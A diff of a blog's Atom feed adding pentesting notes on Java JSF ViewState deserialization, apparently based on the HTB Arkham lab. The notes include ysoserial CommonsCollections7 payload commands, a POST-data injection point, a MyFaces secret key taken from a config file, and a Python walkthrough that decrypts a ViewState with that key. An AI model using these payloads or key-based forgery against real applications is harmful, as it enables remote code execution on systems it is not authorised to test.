@@ -4,13 +4,172 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-04-05T18:05:47+08:00</updated>
+ <updated>2022-04-05T18:14:07+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Java JSF ViewState Deserialization</title>
+   <link href="https://mvineza.github.io/spindel/2022/04/05/java-jsf-viewstate-deserialization"/>
+   <updated>2022-04-05T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/04/05/Java-JSF-ViewState-Deserialization</id>
+   <content type="html">&lt;h2 id=&quot;viewstate&quot;&gt;Viewstate&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Maintains states between postbacks&lt;/li&gt;
+  &lt;li&gt;Can be stored on client or server side. This is controlled by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;javax.faces.STATE_SAVING_METHOD&lt;/code&gt; settings.&lt;/li&gt;
+  &lt;li&gt;There are 2 major implementatons:
+    &lt;ul&gt;
+      &lt;li&gt;Oracle Mojarra (JSF reference implementation)&lt;/li&gt;
+      &lt;li&gt;Apache MyFaces&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Can also be encrypted. base64-encoded keys are set by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.apache.myfaces.SECRET&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;If viewstate starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;H4sIAAAA&lt;/code&gt;, it is base64 gzip&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;viewstate-structure&quot;&gt;Viewstate Structure&lt;/h2&gt;
+&lt;p&gt;It is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.util.HashMap&lt;/code&gt;. Here is an example when generating a payload using ysoserial.&lt;/p&gt;
+
+&lt;p&gt;`&lt;/p&gt;
+
+&lt;p&gt;On a side note, java serialized objects starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AC ED&lt;/code&gt;. Here is an example viewstate from HTB Arkham.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b'\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x011pt\x00\x12/userSubscribe.jsp\x02\x02'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;example-errors&quot;&gt;Example Errors&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# error when providing invalid value to viewstate&lt;/span&gt;
+javax.faces.application.ViewExpiredException: viewId:&amp;amp;#47&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;userSubscribe.faces - No saved view state could be found &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the view identifier: &amp;amp;#47&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;userSubscribe.faces
+org.apache.myfaces.lifecycle.RestoreViewExecutor.execute&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RestoreViewExecutor.java:88&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+org.apache.myfaces.lifecycle.LifecycleImpl.executePhase&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LifecycleImpl.java:103&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+org.apache.myfaces.lifecycle.LifecycleImpl.execute&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LifecycleImpl.java:76&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+javax.faces.webapp.FacesServlet.service&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FacesServlet.java:244&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+org.apache.tomcat.websocket.server.WsFilter.doFilter&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WsFilter.java:52&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;injection-points&quot;&gt;Injection Points&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# post data&lt;/span&gt;
+j_id_jsp_1623871077_1%3Aemail&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;a&amp;amp;j_id_jsp_1623871077_1%3Asubmit&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&amp;amp;javax.faces.ViewState&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;PAYLOAD&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;payload-gadgets-and-affected-libraries&quot;&gt;Payload Gadgets and Affected Libraries&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;commons-collections-3.2.1.jar&lt;/li&gt;
+  &lt;li&gt;commons-collections:3.1 - CommonsCollections7 in ysoserial&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;payloads&quot;&gt;Payloads&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ysoserial, CommonsCollections7&lt;/span&gt;
+java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 &lt;span class=&quot;s2&quot;&gt;&quot;ping 10.10.14.31&quot;&lt;/span&gt;
+java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 &lt;span class=&quot;s2&quot;&gt;&quot;ping 10.10.14.31&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload.dat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;interesting-files-and-directories&quot;&gt;Interesting Files and Directories&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# config files&lt;/span&gt;
+faces-config.xml
+web.xml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;interesting-url-paths&quot;&gt;Interesting URL Paths&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# JSF pages normally ends in .faces&lt;/span&gt;
+/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ANYTHING&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.faces
+:8080/UserSubscribe.faces
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;encryption&quot;&gt;Encryption&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Default algorithm is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DES ECB mode&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Viewstate can be encrypted. You can check for encyrption keys in this part of config files.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.SECRET&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_ALGORITHM&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;HmacSHA1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+     &lt;span class=&quot;nt&quot;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_SECRET&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Here is an &lt;a href=&quot;https://0xdf.gitlab.io/2019/08/10/htb-arkham.html#decrypt-viewstate&quot;&gt;example&lt;/a&gt; encryption and decryption process using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HmacSHA1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# encryption&lt;/span&gt;
+payload -&amp;gt; des_ecb_encrypt -&amp;gt; hmac_sha1_sig -&amp;gt; b64_encode -&amp;gt; url_encode
+
+&lt;span class=&quot;c&quot;&gt;# decryption&lt;/span&gt;
+vs -&amp;gt; url_decode -&amp;gt; b64_decode -&amp;gt; hmac_sha1_unsig -&amp;gt; des_ecb_decrypt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Python3 decryption&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# initialize
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# url_decode
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_decoded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unquote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_decoded&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE='&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
+
+&lt;span class=&quot;c1&quot;&gt;# b64_decode
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64_decoded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_decoded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64_decoded&lt;/span&gt;
+&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;z4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xee\xe5\xc7\x88\xb4\x88\xbe&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb5\xe4\x12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x01\xbe&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x99\xf3\xde&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x03\xe6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x8~&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xdb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8d\xa3\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa8\xb6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8e\xef&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xad\x0e\xd9\xe0\x8c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb4\x98\xdc\xc0\xf6\xa1\xe3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xea\xf1\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd6\xef&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb5\x99\xd2\x81&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xdc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gOTf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9c\x82\xb8\xd7\t\xbb\x11&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
+
+&lt;span class=&quot;c1&quot;&gt;# hmac_sha1_unsig - separate message and tag (mac)
+#  tag     = last 20 bytes
+#  message = whole signature - last 20 bytes
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64_decoded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64_decoded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t_bytes&lt;/span&gt;
+&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x99\xd2\x81&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xdc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gOTf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9c\x82\xb8\xd7\t\xbb\x11&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m_bytes&lt;/span&gt;
+&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;z4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xee\xe5\xc7\x88\xb4\x88\xbe&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb5\xe4\x12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x01\xbe&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x99\xf3\xde&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x03\xe6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x8~&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xdb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8d\xa3\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa8\xb6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8e\xef&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xad\x0e\xd9\xe0\x8c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb4\x98\xdc\xc0\xf6\xa1\xe3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xea\xf1\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd6\xef&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
+
+&lt;span class=&quot;c1&quot;&gt;# des_ecb_decrypt - here you see the actual java serialized
+# object which starts with &quot;\xac\xed&quot;. It also includes the
+# URL path associated with the object which is:
+#   /userSubscribe.jsp
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DES&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JsF9876-'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crypter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MODE_ECB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crypter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xac\xed\x00\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ur&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x13&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[Ljava.lang.Object;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\xce&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9f\x10&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)l&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x02\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\x00\x03&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x01&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1pt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/userSubscribe.jsp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x02\x02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;tools&quot;&gt;Tools&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://viewstatedecoder.azurewebsites.net/&quot;&gt;Online viewstate decoder&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization&quot;&gt;Hacktricks - JSF Deserialization&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf&quot;&gt;JSF ViewState upside-down&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://dhiyaneshgeek.github.io/web/security/2021/05/08/demystifying-insecure-deserialisation-on-JSF-application/&quot;&gt;Demystifying Insecure Deserialisation on JSF Application&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application&quot;&gt;Secure Your Application - MYFACES2 - Apache Software Foundation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;HTB Arkham&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Node JS Deserialization - Cookie</title>
